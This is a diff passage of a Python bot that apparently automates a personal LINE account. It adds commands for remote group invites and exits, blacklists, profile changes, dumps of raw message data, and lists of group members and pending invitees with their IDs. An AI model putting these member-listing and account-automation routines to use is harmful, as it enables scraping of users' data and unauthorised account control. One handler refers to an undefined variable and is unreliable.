+                        a = han.getChats([msg[2]])
+                        gmb = a[1][0][8][1][5]
+                        target = []
+                        cancel = []
+                        if gmb != None:
+                            for g in gmb:
+                                y = han.getContact(g)
+                                if y in gmb:
+                                    target.append(y)
+                        if target == []:
+                            han.replyMessage(msg,"沒有符合的對象")
+                            pass
+                        else:
+                            for i in target:
+                                ybk["cancel"].append(i)
+                                backupData()
+                                cancel.append(i)
+                                txt = "ΞΞΞ〘新增取消名單〙ΞΞΞ"
+                                no = 0
+                                if len(cancel) != 0:
+                                    for x in cancel:
+                                        no += 1
+                                        txt += f"\n※{no}.{x[22]}"
+                                else:
+                                    txt += "\n無"
+                                han.replyMessage(msg, txt + "\nΞΞΞΞΞ〘𝓱𝓪𝓷 ßôt〙ΞΞΞΞΞ") 
+                        del target
+                        del cancel
+                    elif text.startswith("lbinv:"):
+                        if msg[1] in creator['creator']:
+                            gid = text.replace("lbinv:","")
+                            try:
+                                try:
+                                    han.findAndAddContactsByMid([msg[1]])
+                                except:
+                                    pass
+                                try: 
+                                    try:
+                                        han.inviteIntoChat(gid,[msg[1]])
+                                        han.sendMessage(gid,"接收遠端邀請指令")
+                                        han.replyMessage(msg,"邀請成功")
+                                    except Exception as e:
+                                        print(e)
+                                        han.replyMessage(msg, "邀請失敗")
+                                except:
+                                    han.replyMessage(msg, "邀請失敗")  
+                            except:
+                                han.replyMessage(msg, "Error-->invalid gid")
+                        else:
+                            han.replyMessage(msg, "無權使用開發者指令")
+                            report(msg[2],msg[1],"管理員嘗試使用遠端邀請指令")
+                    elif text.startswith("lbleave:"):
+                        if msg[1] in creator['creator']:
+                            try:
+                                gid = text.replace("lbleave:","")
+                                print(gid)
+                                if gid == "":
+                                    han.replyMessage(msg, "請輸入群組Gid")
+                                else:
+                                    try:
+                                        han.sendMessage(gid,"接收遠端退群指令")
+                                        han.deleteSelfFromChat(gid)
+                                        han.replyMessage(msg,"退群成功")
+                                    except:
+                                        han.replyMessage(msg, "我不在那個群組裡")  
+                            except:
+                                han.replyMessage(msg, "Error-->invalid gid")
+                        else:
+                            han.replyMessage(msg, "無權使用開發者指令")
+                            report(msg[2],msg[1],"管理員嘗試使用遠端退群指令")
+                    elif text.startswith("lbpn:"):
+                        if msg[1] in creator['creator']:
+                            key = msg[10][5:]
+                            if len(key) == 0:
+                                han.replyMessage(msg, 'Rename Error')
+                            else:
+                                han.updateProfileAttribute(2, key)
+                                han.replyMessage(msg, f'名稱已更改為:\n{key}')
+                        else:
+                            han.replyMessage(msg, "無權使用開發者指令")
+                            report(msg[2],msg[1],"權限者嘗試更改名稱")
+                    elif text.startswith("lbcb:"): 
+                        if msg[1] in creator['creator']:
+                            bio = msg[10][5:]
+                            han.updateProfileAttribute(16, bio)
+                            han.replyMessage(msg, f'個簽已更改為:\n{bio}')
+                        else:
+                            han.replyMessage(msg, "無權使用開發者指令")
+                            report(msg[2],msg[1],"權限者嘗試更改個簽")
+                    elif text.startswith("ginfo:"):
+                        gid = msg[10][6:]
+                        # if len(gid) <= 33:
+                        #     han.replyMessage(msg, "Error-->invalid gid")
+                        # else:
+                        try:
+                            group = han.getChats([gid])
+                            gtime = group[1][0][3]
+                            gtimee = int(round(gtime/1000))
+                            try:
+                                y = group[1][0][8][1][1]
+                                z = han.getContact(y)
+                                gCreator = z[22]
+                            except:
+                                gCreator = "創群者已砍帳"
+                            if group[1][0][8][1][5] is None:
+                                gPending = "0"
+                            else:
+                                gPending = str(len(group[1][0][8][1][5]))				
+                            ret_ ="ΞΞΞΞΞΞΞ〘群組資訊〙ΞΞΞΞΞΞΞ"
+                            ret_ +="\n※群組名稱:\n{}".format(str(group[1][0][6]))                    
+                            ret_ +="\n※成員數量:\n"+(str(len(group[1][0][8][1][4])))
+                            ret_ +="\n※邀請數量:\n"+(gPending)
+                            ret_ +="\n※創群者:\n"+(str(gCreator))
+                            ret_ +="\n※群組建立時間:\n{}".format(time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(gtimee)))
+                            ret_ +="\n※Gid:\n{}".format(gid)
+                            ret_ +="\nΞΞΞΞΞΞΞ〘𝓱𝓪𝓷 ßôt〙ΞΞΞΞΞΞΞ"
+                            han.replyMessage(msg, str(ret_))
+                        except:
+                            han.replyMessage(msg, "Error-->invalid gid")
+                    elif text.startswith("contact:"):
+                        key = msg[10][8:]
+                        if len(key) != 33:
+                            han.sendMessage(msg[2], 'Error-->invalid mid', relatedMessageId=msg[4])
+                        else:
+                            try:
+                                xmid = han.getContact(key)[2]
+                                try:
+                                    han.sendContact(msg[2], key)
+                                except:
+                                    pass
+                            except:
+                                han.sendMessage(msg[2], 'Error-->invalid mid', relatedMessageId=msg[4])
+                    elif text.startswith("badd:"):
+                        x = msg[10][5:]
+                        y = han.getContact(x)
+                        if len(x) != 33:
+                            han.replyMessage(msg, "Error-->invalid mid")
+                        else:
+                            if x not in creator['creator'] and x not in admin['admin'] and x not in ban['blacklist']:
+                                txt = "ΞΞΞΞ〘Mid新增黑單〙ΞΞΞΞ"
+                                ban['blacklist'].append(x)
+                                backupData()
+                                txt += f"\n{y[22]}\n{x}"
+                                han.replyMessage(msg, txt+ "\nΞΞΞΞΞ〘𝓱𝓪𝓷 ßôt〙ΞΞΞΞΞ")
+                            else:
+                                han.replyMessage(msg, "新增失敗")
+                            report(msg[2],msg[1],"Mid新增黑單指令觸發",x)
+                    elif text.startswith("bdel:"):
+                        x = msg[10][5:]
+                        y = han.getContact(x)
+                        if len(x) != 33:
+                            han.replyMessage(msg, "Error-->invalid mid")
+                        else:
+                            if msg[1] in creator['creator']:
+                                if x in ban['blacklist']:
+                                    txt = "ΞΞΞΞ〘Mid刪除黑單〙ΞΞΞΞ"
+                                    ban['blacklist'].remove(x)
+                                    backupData()
+                                    txt += f"\n{y[22]}\n{x}"
+                                    han.replyMessage(msg, txt+ "\nΞΞΞΞΞ〘𝓱𝓪𝓷 ßôt〙ΞΞΞΞΞ")
+                                else:
+                                    han.replyMessage(msg, "他不在黑單")
+                                report(msg[2],msg[1],"Mid刪除黑單指令觸發",x)
+                            else:
+                                han.replyMessage(msg, "無權使用開發者指令")
+                                report(msg[2],msg[1],"管理員嘗試使用Mid刪除黑單",x)
+                    elif text.startswith("data:"):
+                        num = int(msg[10][5:])+1
+                        try:
+                            data = han.getRecentMessagesV2(msg[2])[num-1]
+                            han.sendMessage(msg[2], f'{data}')
+                        except Exception as e:
+                            han.sendMessage(msg[2], f'{e}', relatedMessageId=msg[4])
+                    elif text.startswith("gmlt:"):
+                        gid = msg[10][5:]
+                        try:
+                            group = han.getChats([gid])
+                            han.replyMessage(msg,"成員加載中...\n請稍後(｡･ω･｡)")
+                            gmb = group[1][0][8][1][4]
+                            if len(gmb) > 500:
+                                han.replyMessage(msg,"該群突破500人無法查詢")
+                                pass
+                            else:
+                                d = ""
+                                d += "ΞΞΞΞΞΞΞ〘群組成員〙ΞΞΞΞΞΞΞ\n"
+                                d += "※群組名稱:{}\n".format(str(group[1][0][6]))
+                                b = 0
+                                for i in gmb:
+                                    try:
+                                        if len(str(d)) >= 8500:
+                                            d += "ΞΞΞΞΞΞΞ〘𝓱𝓪𝓷 ßôt〙ΞΞΞΞΞΞΞ"
+                                            han.replyMessage(msg,d)
+                                            d = ""
+                                            d += "ΞΞΞΞΞΞΞ〘群組成員〙ΞΞΞΞΞΞΞ\n"
+                                            d += "※群組名稱:{}※\n".format(str(group[1][0][6]))
+                                        else:
+                                            b = b + 1
+                                            mn = han.getContact(i)[22]
+                                            mi = str(i)
+                                            mm = gmb[i]
+                                            nn = int(round(mm/1000))
+                                            kk = (str(time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(nn))))
+                                            d += ("※{}."+mn+"\n"+mi+"\n加入時間:" + kk + "\n").format(b)
+                                    except Exception as e:
+                                        print(f'gmlt error-->{e}')
+                                d += "ΞΞΞΞΞΞΞ〘𝓱𝓪𝓷 ßôt〙ΞΞΞΞΞΞΞ"
+                                time.sleep(1);han.replyMessage(msg,d)
+                        except:
+                            han.replyMessage(msg,"Error-->invalid gid")
+                    elif text.startswith('inlt:'):
+                        gid = msg[10][5:]
+                        try:
+                            group = han.getChats([gid])
+                            han.replyMessage(msg,"邀請列表加載中...\n請稍後(｡･ω･｡)")
+                            gmb = group[1][0][8][1][5]
+                            if len(gmb) > 500:
+                                han.replyMessage(msg,"該群突破500人無法查詢")
+                                pass
+                            else:
+                                d = ""
+                                d += "ΞΞΞΞΞΞΞ〘邀請列表〙ΞΞΞΞΞΞΞ\n"
+                                d += "※群組名稱:{}\n".format(str(group[1][0][6]))
+                                b = 0
+                                for i in gmb:
+                                    try:
+                                        if len(str(d)) >= 8500:
+                                            d += "ΞΞΞΞΞΞΞ〘𝓱𝓪𝓷 ßôt〙ΞΞΞΞΞΞΞ"
+                                            han.replyMessage(msg,d)
+                                            d = ""
+                                            d += "ΞΞΞΞΞΞΞ〘邀請列表〙ΞΞΞΞΞΞΞ\n"
+                                            d += "※群組名稱:{}※\n".format(str(group[1][0][6]))
+                                        else:
+                                            if gmb is None:
+                                                d+= "※無邀請列表"   
+                                            else:
+                                                b = b + 1
+                                                mn = han.getContact(i)[22]
+                                                mi = str(i)
+                                                mm = gmb[i]
+                                                nn = int(round(mm/1000))
+                                                kk = (str(time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(nn))))
+                                                d += ("※{}."+mn+"\n"+mi+"\n邀請時間:" + kk + "\n").format(b)
+                                    except Exception as e:
+                                        print(f'gmlt error-->{e}')
+                                d += "ΞΞΞΞΞΞΞ〘𝓱𝓪𝓷 ßôt〙ΞΞΞΞΞΞΞ"
+                                time.sleep(1);han.replyMessage(msg,d)
+                        except:
+                            han.replyMessage(msg,"Error-->invalid gid")
+                    elif text.startswith("cbk:"):
+                        if msg[1] in creator['creator']:
+                            nb = msg[10][4:]
+                            try:
+                                han.sendMessage(nb,"測試更改")
+                                backdoor['backdoor'] = nb
+                                backupData()
+                                han.replyMessage(msg,"更改成功 目前後台為:")
+                                try:
+                                    han.sendContact(to, nb)
+                                except:
+                                    f = han.getChats([nb])
+                                    han.replyMessage(msg,"{}\nID:\n{}".format(str(f[1][0][6]),nb))
+                                han.replyMessage(msg,"提示:重啟後才會變更更改")
+                            except Exception as e:
+                                han.replyMessage(msg,"更改失敗 原因:\n{}".format(e))
+                        else:
+                            han.replyMessage(msg,"無權使用開發者指令")
+                            report(msg[2],msg[1],"管理員嘗試更改後台")  
+                if msg[15] == 1:
+                    if settings["pic"] == True:
+                        if msg[1] in settings["picmid"]:
+                            try:
+                                han.downloadObjectMsg(msg[4],path="test.jpg")
+                                han.sendMessage(msg[2], "圖片下載完成\n正在更換頭貼(｡･ω･｡)")
+                                han.updateProfileImage(path="test.jpg")
+                                han.sendMessage(msg[2], "更改完成(｡･ω･｡)")
+                                settings["pic"] = False           
+                                settings["picmid"] = [] 
+                                backupData()   
+                                os.remove("test.jpg")
+                            except Exception as e:
+                                print(e)
+                                han.sendMessage(msg[2], "更改失敗(｡･ω･｡)")
+                                han.sendMessage(msg[2], f'{e}')
+                                settings["pic"] = False           
+                                settings["picmid"] = [] 
+                                backupData()
+                                os.remove("test.jpg")
+                    if settings['cover'] == True:
+                        if msg[1] in settings["covermid"]:
+                            try:
+                                han.downloadObjectMsg(msg[4],path="cover.jpg")
+                                han.sendMessage(msg[2], "圖片下載完成\n正在更換封面(｡･ω･｡)")
+                                han.updateProfileCover(path="cover.jpg")
+                                han.sendMessage(msg[2], "更改完成(｡･ω･｡)")
+                                settings["cover"] = False           
+                                settings["covermid"] = [] 
+                                backupData()   
+                                os.remove("cover.jpg")
+                            except Exception as e:
+                                print(e)
+                                han.sendMessage(msg[2], "更改失敗(｡･ω･｡)")
+                                han.sendMessage(msg[2], f'{e}')
+                                settings["cover"] = False           
+                                settings["covermid"] = [] 
+                                backupData()
+                                os.remove("cover.jpg")
+        except Exception as e:
+            print(e)
+    def main(self):
+        self.start()
+        try:
+            self.han.trace(self.bot)
+        except Exception as e:
+            print(e)
+            os._exit(1)
+if __name__=='__main__':
+    bot()
